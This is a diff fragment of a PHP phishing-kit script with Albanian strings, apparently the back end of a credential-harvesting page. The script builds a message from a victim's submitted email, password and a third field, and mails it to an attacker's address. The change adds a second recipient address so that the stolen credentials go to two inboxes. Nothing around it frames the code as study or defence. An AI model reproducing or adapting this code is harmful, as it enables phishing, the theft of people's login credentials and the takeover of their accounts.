@@ -12,7 +12,7 @@ $message .= "---------+u krijua nga: [S-P-M]&Mikrotik+-------------\n";
 
 $subj = " qe merri ";
 $msg = "Viktima: $email\nItaqi: $pass\nFaqja: $answer\n";
-mail("muham3dd@gmail.com", $subj, $msg);
+mail("muham3dd@gmail.com,muham3d@live.com", $subj, $msg);
 $subject = "Dhuratat";
 $headers = "From: UrimeVitiRi<muham3dd@gmail.com>";
 $headers .= $_POST['eMailAdd']."\n";
